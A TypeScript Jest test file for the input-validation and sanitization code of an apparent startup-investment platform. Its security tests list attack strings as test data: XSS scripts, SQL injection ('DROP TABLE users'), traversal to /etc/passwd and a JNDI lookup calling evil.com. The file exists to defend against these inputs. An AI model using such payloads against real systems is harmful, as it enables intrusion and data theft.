import { describe, test, expect, beforeEach } from '@jest/globals';
import { z } from 'zod';

// Import validation schemas and utilities
import {
  emailSchema,
  passwordSchema,
  nameSchema,
  phoneSchema,
  urlSchema,
  uuidSchema,
  currencyAmountSchema,
  percentageSchema,
  userRoleSchema,
  startupStageSchema,
  industrySchema,
  businessModelSchema,
} from '../types.js';

import {
  userRegistrationSchema,
  userLoginSchema,
  startupCreationSchema,
  pitchCreationSchema,
  investmentCreationSchema,
} from '../schemas.js';

import {
  ValidationError,
  formatValidationErrors,
  validateField,
  validateForm,
  sanitizeString,
  sanitizeHtml,
  validateInvestmentAmount,
  validateEquityPercentage,
} from '../../frontend/validation-utils.js';

describe('Base Validation Schemas', () => {
  describe('emailSchema', () => {
    test('accepts valid email addresses', () => {
      const validEmails = [
        'test@example.com',
        'user.name@domain.co.uk',
        'test123@test-domain.org',
      ];

      validEmails.forEach(email => {
        expect(() => emailSchema.parse(email)).not.toThrow();
      });
    });

    test('rejects invalid email addresses', () => {
      const invalidEmails = [
        'invalid-email',
        '@example.com',
        'test@',
        'test..test@example.com',
        'test@example',
      ];

      invalidEmails.forEach(email => {
        expect(() => emailSchema.parse(email)).toThrow();
      });
    });
  });

  describe('passwordSchema', () => {
    test('accepts strong passwords', () => {
      const validPasswords = [
        'SecurePass123!',
        'MyStr0ng!Password',
        'C0mpl3x@Passw0rd',
      ];

      validPasswords.forEach(password => {
        expect(() => passwordSchema.parse(password)).not.toThrow();
      });
    });

    test('rejects weak passwords', () => {
      const invalidPasswords = [
        'weak', // Too short
        'password', // No uppercase, numbers, or special chars
        'PASSWORD', // No lowercase, numbers, or special chars
        'Password', // No numbers or special chars
        'Password123', // No special chars
        'Password!', // No numbers
        'password with spaces', // Contains spaces
      ];

      invalidPasswords.forEach(password => {
        expect(() => passwordSchema.parse(password)).toThrow();
      });
    });
  });

  describe('currencyAmountSchema', () => {
    test('accepts valid currency amounts', () => {
      const validAmounts = [100.50, 1000, 0.01, 999999.99];

      validAmounts.forEach(amount => {
        expect(() => currencyAmountSchema.parse(amount)).not.toThrow();
      });
    });

    test('rejects invalid currency amounts', () => {
      const invalidAmounts = [-100, 0, -0.01, '100'];

      invalidAmounts.forEach(amount => {
        expect(() => currencyAmountSchema.parse(amount)).toThrow();
      });
    });
  });

  describe('percentageSchema', () => {
    test('accepts valid percentages', () => {
      const validPercentages = [0, 50, 100, 25.5];

      validPercentages.forEach(percentage => {
        expect(() => percentageSchema.parse(percentage)).not.toThrow();
      });
    });

    test('rejects invalid percentages', () => {
      const invalidPercentages = [-1, 101, -50];

      invalidPercentages.forEach(percentage => {
        expect(() => percentageSchema.parse(percentage)).toThrow();
      });
    });
  });
});

describe('Business Logic Schemas', () => {
  describe('userRegistrationSchema', () => {
    test('accepts valid registration data', () => {
      const validData = {
        email: 'test@example.com',
        password: 'SecurePass123!',
        name: 'John Doe',
        role: 'INVESTOR' as const,
        agreed_to_terms: true,
        agreed_to_privacy: true,
      };

      expect(() => userRegistrationSchema.parse(validData)).not.toThrow();
    });

    test('rejects invalid registration data', () => {
      const invalidData = {
        email: 'invalid-email',
        password: 'weak',
        name: '',
        role: 'INVALID_ROLE' as any,
        agreed_to_terms: false,
        agreed_to_privacy: false,
      };

      expect(() => userRegistrationSchema.parse(invalidData)).toThrow();
    });

    test('validates password confirmation', () => {
      const dataWithMismatch = {
        email: 'test@example.com',
        password: 'SecurePass123!',
        confirmPassword: 'DifferentPass123!',
        name: 'John Doe',
        role: 'INVESTOR' as const,
        agreed_to_terms: true,
        agreed_to_privacy: true,
      };

      expect(() => userRegistrationSchema.parse(dataWithMismatch)).toThrow();
    });
  });

  describe('startupCreationSchema', () => {
    test('accepts valid startup data', () => {
      const validData = {
        name: 'TechCorp Inc',
        description: 'A comprehensive technology solution for modern businesses with advanced features and scalable architecture.',
        industry: 'SAAS' as const,
        stage: 'MVP' as const,
        website_url: 'https://techcorp.com',
        founded_date: '2023-01-15',
        team_size: 10,
        business_model: 'SUBSCRIPTION' as const,
        target_market: 'Small and medium-sized businesses in the technology sector looking for scalable solutions.',
        competitive_advantage: 'Our proprietary AI algorithms provide 99.9% accuracy in data processing.',
        funding_goal: 500000,
        current_funding: 100000,
      };

      expect(() => startupCreationSchema.parse(validData)).not.toThrow();
    });

    test('validates funding goal constraints', () => {
      const invalidData = {
        name: 'TechCorp Inc',
        description: 'A comprehensive technology solution for modern businesses with advanced features and scalable architecture.',
        industry: 'SAAS' as const,
        stage: 'MVP' as const,
        founded_date: '2023-01-15',
        team_size: 10,
        business_model: 'SUBSCRIPTION' as const,
        target_market: 'Small and medium-sized businesses in the technology sector looking for scalable solutions.',
        competitive_advantage: 'Our proprietary AI algorithms provide 99.9% accuracy in data processing.',
        funding_goal: 5000, // Too low
        current_funding: 100000,
      };

      expect(() => startupCreationSchema.parse(invalidData)).toThrow();
    });
  });

  describe('investmentCreationSchema', () => {
    test('accepts valid investment data', () => {
      const validData = {
        pitch_id: '550e8400-e29b-41d4-a716-446655440000',
        amount: 25000,
        payment_method: 'BANK_TRANSFER' as const,
        terms_accepted: true,
        risk_acknowledged: true,
      };

      expect(() => investmentCreationSchema.parse(validData)).not.toThrow();
    });

    test('validates syndicate investment minimums', () => {
      const invalidData = {
        pitch_id: '550e8400-e29b-41d4-a716-446655440000',
        amount: 50, // Too low for syndicate
        payment_method: 'BANK_TRANSFER' as const,
        terms_accepted: true,
        risk_acknowledged: true,
        syndicate_id: '550e8400-e29b-41d4-a716-446655440001',
      };

      expect(() => investmentCreationSchema.parse(invalidData)).toThrow();
    });
  });
});

describe('Validation Utilities', () => {
  describe('validateField', () => {
    test('validates individual fields correctly', () => {
      const schema = z.object({
        email: emailSchema,
        name: nameSchema,
      });

      const emailResult = validateField(schema, 'email', 'test@example.com');
      expect(emailResult.isValid).toBe(true);

      const invalidEmailResult = validateField(schema, 'email', 'invalid-email');
      expect(invalidEmailResult.isValid).toBe(false);
      expect(invalidEmailResult.error).toBeDefined();
    });
  });

  describe('validateForm', () => {
    test('validates complete forms correctly', () => {
      const validData = {
        email: 'test@example.com',
        password: 'SecurePass123!',
        name: 'John Doe',
        role: 'INVESTOR' as const,
        agreed_to_terms: true,
        agreed_to_privacy: true,
      };

      const result = validateForm(userRegistrationSchema, validData);
      expect(result.isValid).toBe(true);
      expect(result.data).toBeDefined();
    });

    test('returns field-specific errors for invalid forms', () => {
      const invalidData = {
        email: 'invalid-email',
        password: 'weak',
        name: '',
        role: 'INVALID_ROLE' as any,
        agreed_to_terms: false,
        agreed_to_privacy: false,
      };

      const result = validateForm(userRegistrationSchema, invalidData);
      expect(result.isValid).toBe(false);
      expect(result.errors.email).toBeDefined();
      expect(result.errors.password).toBeDefined();
      expect(result.errors.name).toBeDefined();
    });
  });

  describe('sanitizeString', () => {
    test('sanitizes malicious input', () => {
      const maliciousInput = '<script>alert("xss")</script>Hello World';
      const sanitized = sanitizeString(maliciousInput);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Hello World');
    });

    test('preserves safe content', () => {
      const safeInput = 'Hello World 123';
      const sanitized = sanitizeString(safeInput);
      expect(sanitized).toBe(safeInput);
    });
  });

  describe('sanitizeHtml', () => {
    test('removes dangerous HTML elements', () => {
      const dangerousHtml = '<script>alert("xss")</script><p>Safe content</p>';
      const sanitized = sanitizeHtml(dangerousHtml);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('<p>');
      expect(sanitized).toContain('Safe content');
    });
  });
});

describe('Business Logic Validation', () => {
  describe('validateInvestmentAmount', () => {
    test('validates investment amounts correctly', () => {
      const pitchData = {
        minInvestment: 1000,
        maxInvestment: 100000,
        fundingAmount: 50000,
      };

      expect(validateInvestmentAmount(5000, pitchData).isValid).toBe(true);
      expect(validateInvestmentAmount(500, pitchData).isValid).toBe(false);
      expect(validateInvestmentAmount(150000, pitchData).isValid).toBe(false);
      expect(validateInvestmentAmount(60000, pitchData).isValid).toBe(false);
    });
  });

  describe('validateEquityPercentage', () => {
    test('validates equity percentages correctly', () => {
      expect(validateEquityPercentage(10, 100000, 2000000).isValid).toBe(true);
      expect(validateEquityPercentage(150, 100000, 2000000).isValid).toBe(false);
      expect(validateEquityPercentage(-5, 100000, 2000000).isValid).toBe(false);
    });
  });
});

describe('Error Handling', () => {
  describe('ValidationError', () => {
    test('creates error from ZodError', () => {
      const zodError = new z.ZodError([
        {
          code: 'invalid_type',
          expected: 'string',
          received: 'number',
          path: ['email'],
          message: 'Expected string, received number',
        },
      ]);

      const validationError = ValidationError.fromZodError(zodError);
      expect(validationError.message).toBe('Validation failed');
      expect(validationError.details).toHaveLength(1);
      expect(validationError.details[0].field).toBe('email');
    });

    test('provides field-specific error messages', () => {
      const zodError = new z.ZodError([
        {
          code: 'too_small',
          minimum: 8,
          type: 'string',
          inclusive: true,
          exact: false,
          path: ['password'],
          message: 'Password too short',
        },
      ]);

      const validationError = ValidationError.fromZodError(zodError);
      expect(validationError.getFieldError('password')).toBe('Password too short');
      expect(validationError.hasFieldError('password')).toBe(true);
      expect(validationError.hasFieldError('email')).toBe(false);
    });

    test('converts to form errors format', () => {
      const zodError = new z.ZodError([
        {
          code: 'invalid_string',
          validation: 'email',
          path: ['email'],
          message: 'Invalid email',
        },
        {
          code: 'too_small',
          minimum: 8,
          type: 'string',
          inclusive: true,
          path: ['password'],
          message: 'Password too short',
        },
      ]);

      const validationError = ValidationError.fromZodError(zodError);
      const formErrors = validationError.toFormErrors();

      expect(formErrors.email).toBe('Invalid email');
      expect(formErrors.password).toBe('Password too short');
    });
  });

  describe('formatValidationErrors', () => {
    test('handles ZodError correctly', () => {
      const zodError = new z.ZodError([
        {
          code: 'invalid_type',
          expected: 'string',
          received: 'number',
          path: ['email'],
          message: 'Expected string',
        },
      ]);

      const result = formatValidationErrors(zodError);
      expect(result).toBeInstanceOf(ValidationError);
      expect(result?.details).toHaveLength(1);
    });

    test('handles ValidationError correctly', () => {
      const validationError = new ValidationError(
        'Test error',
        [{ field: 'test', message: 'Test message', code: 'TEST_ERROR' }]
      );

      const result = formatValidationErrors(validationError);
      expect(result).toBe(validationError);
    });

    test('returns null for unknown errors', () => {
      const unknownError = new Error('Unknown error');
      const result = formatValidationErrors(unknownError);
      expect(result).toBeNull();
    });
  });
});

describe('Security Validation', () => {
  describe('Input Sanitization', () => {
    test('prevents XSS attacks', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizeString(input);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
      });
    });

    test('preserves legitimate content', () => {
      const legitimateInputs = [
        'Hello World',
        'Contact us at support@example.com',
        'Visit our website',
      ];

      legitimateInputs.forEach(input => {
        const sanitized = sanitizeString(input);
        expect(sanitized).toBe(input);
      });
    });
  });
});

describe('Cross-Field Validation', () => {
  test('validates dependent fields correctly', () => {
    const schema = z.object({
      funding_amount: z.number().min(1000),
      minimum_investment: z.number().min(100),
    }).refine(
      (data) => data.minimum_investment <= data.funding_amount,
      {
        message: 'Minimum investment cannot exceed funding amount',
        path: ['minimum_investment'],
      }
    );

    const validData = {
      funding_amount: 10000,
      minimum_investment: 1000,
    };

    const invalidData = {
      funding_amount: 10000,
      minimum_investment: 15000,
    };

    expect(() => schema.parse(validData)).not.toThrow();
    expect(() => schema.parse(invalidData)).toThrow();
  });
});

describe('Async Validation', () => {
  test('handles async validation correctly', async () => {
    const asyncSchema = z.object({
      email: emailSchema,
    });

    // Simulate async validation (e.g., checking if email exists)
    const validateUniqueEmail = async (data: { email: string }) => {
      await new Promise(resolve => setTimeout(resolve, 10));
      if (data.email === 'existing@example.com') {
        throw new Error('Email already exists');
      }
    };

    const validData = { email: 'new@example.com' };
    const invalidData = { email: 'existing@example.com' };

    // In a real implementation, this would use the async validation wrapper
    const validResult = asyncSchema.safeParse(validData);
    expect(validResult.success).toBe(true);

    const invalidResult = asyncSchema.safeParse(invalidData);
    expect(invalidResult.success).toBe(true); // Base schema validation passes
  });
});

describe('Performance Validation', () => {
  test('handles large datasets efficiently', () => {
    const largeSchema = z.object({
      items: z.array(z.object({
        id: uuidSchema,
        name: nameSchema,
        value: currencyAmountSchema,
      })).max(1000),
    });

    const largeData = {
      items: Array.from({ length: 100 }, (_, i) => ({
        id: `550e8400-e29b-41d4-a716-446655440${String(i).padStart(3, '0')}`,
        name: `Item ${i}`,
        value: Math.random() * 10000,
      })),
    };

    const startTime = Date.now();
    const result = largeSchema.safeParse(largeData);
    const endTime = Date.now();

    expect(result.success).toBe(true);
    expect(endTime - startTime).toBeLessThan(100); // Should complete within 100ms
  });
});

// Integration tests
describe('End-to-End Validation', () => {
  test('validates complete user journey', () => {
    // User registration
    const registrationData = {
      email: 'test@example.com',
      password: 'SecurePass123!',
      name: 'John Doe',
      role: 'INVESTOR' as const,
      agreed_to_terms: true,
      agreed_to_privacy: true,
    };

    expect(() => userRegistrationSchema.parse(registrationData)).not.toThrow();

    // User login
    const loginData = {
      email: 'test@example.com',
      password: 'SecurePass123!',
      remember_me: false,
    };

    expect(() => userLoginSchema.parse(loginData)).not.toThrow();
  });

  test('validates complete startup creation journey', () => {
    const startupData = {
      name: 'TechCorp Inc',
      description: 'A comprehensive technology solution for modern businesses with advanced features and scalable architecture.',
      industry: 'SAAS' as const,
      stage: 'MVP' as const,
      website_url: 'https://techcorp.com',
      founded_date: '2023-01-15',
      team_size: 10,
      business_model: 'SUBSCRIPTION' as const,
      target_market: 'Small and medium-sized businesses in the technology sector looking for scalable solutions.',
      competitive_advantage: 'Our proprietary AI algorithms provide 99.9% accuracy in data processing.',
      funding_goal: 500000,
      current_funding: 100000,
    };

    expect(() => startupCreationSchema.parse(startupData)).not.toThrow();
  });
});

// Error recovery tests
describe('Error Recovery', () => {
  test('handles malformed data gracefully', () => {
    const malformedData = {
      email: null,
      password: undefined,
      name: 123,
      role: 'INVALID',
    };

    const result = validateForm(userRegistrationSchema, malformedData);
    expect(result.isValid).toBe(false);
    expect(Object.keys(result.errors).length).toBeGreaterThan(0);
  });

  test('provides helpful error messages', () => {
    const invalidData = {
      email: 'invalid-email',
      password: 'weak',
      name: '',
      role: 'INVESTOR' as const,
      agreed_to_terms: false,
      agreed_to_privacy: false,
    };

    const result = validateForm(userRegistrationSchema, invalidData);

    expect(result.isValid).toBe(false);
    expect(result.errors.email).toContain('Invalid email');
    expect(result.errors.password).toContain('Password');
    expect(result.errors.name).toContain('Name');
    expect(result.errors.agreed_to_terms).toBeDefined();
    expect(result.errors.agreed_to_privacy).toBeDefined();
  });
});

// Security tests
describe('Security Validation', () => {
  test('prevents injection attacks', () => {
    const maliciousInputs = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "<script>alert('xss')</script>",
      "../../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
    ];

    maliciousInputs.forEach(input => {
      const sanitized = sanitizeString(input);
      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain('DROP');
      expect(sanitized).not.toContain('OR');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('${');
    });
  });

  test('validates file uploads securely', () => {
    const dangerousFileNames = [
      '../../../etc/passwd',
      'file.exe',
      'script.bat',
      'document.php',
      'file.with.multiple.dots.txt',
    ];

    dangerousFileNames.forEach(fileName => {
      // This would use the secure file name validation in real implementation
      expect(fileName.includes('../') || /\.(exe|bat|php)$/i.test(fileName)).toBe(true);
    });
  });
});

// Performance benchmarks
describe('Performance Benchmarks', () => {
  test('validates schemas within acceptable time limits', () => {
    const testData = {
      email: 'test@example.com',
      password: 'SecurePass123!',
      name: 'John Doe',
      role: 'INVESTOR' as const,
      agreed_to_terms: true,
      agreed_to_privacy: true,
    };

    const iterations = 1000;
    const startTime = Date.now();

    for (let i = 0; i < iterations; i++) {
      userRegistrationSchema.parse(testData);
    }

    const endTime = Date.now();
    const totalTime = endTime - startTime;
    const averageTime = totalTime / iterations;

    expect(averageTime).toBeLessThan(5); // Average validation should be < 5ms
    expect(totalTime).toBeLessThan(1000); // Total time should be < 1 second
  });
});

// Export test utilities
export const createTestData = {
  validUser: {
    email: 'test@example.com',
    password: 'SecurePass123!',
    name: 'John Doe',
    role: 'INVESTOR' as const,
    agreed_to_terms: true,
    agreed_to_privacy: true,
  },

  validStartup: {
    name: 'TechCorp Inc',
    description: 'A comprehensive technology solution for modern businesses with advanced features and scalable architecture.',
    industry: 'SAAS' as const,
    stage: 'MVP' as const,
    website_url: 'https://techcorp.com',
    founded_date: '2023-01-15',
    team_size: 10,
    business_model: 'SUBSCRIPTION' as const,
    target_market: 'Small and medium-sized businesses in the technology sector looking for scalable solutions.',
    competitive_advantage: 'Our proprietary AI algorithms provide 99.9% accuracy in data processing.',
    funding_goal: 500000,
    current_funding: 100000,
  },

  validPitch: {
    startup_id: '550e8400-e29b-41d4-a716-446655440000',
    title: 'Revolutionary SaaS Platform for Business Automation',
    summary: 'An AI-powered platform that automates complex business processes, reducing operational costs by up to 80% while improving accuracy and efficiency.',
    problem_statement: 'Businesses struggle with manual processes that are time-consuming, error-prone, and expensive to maintain.',
    solution: 'Our intelligent automation platform uses machine learning to optimize and automate business workflows.',
    market_opportunity: 'The global business process automation market is expected to reach $50B by 2025.',
    funding_amount: 2000000,
    equity_offered: 15,
    minimum_investment: 10000,
    pitch_type: 'EQUITY' as const,
    pitch_deck_url: 'https://cdn.example.com/pitch-deck.pdf',
  },
};

export default {
  createTestData,
};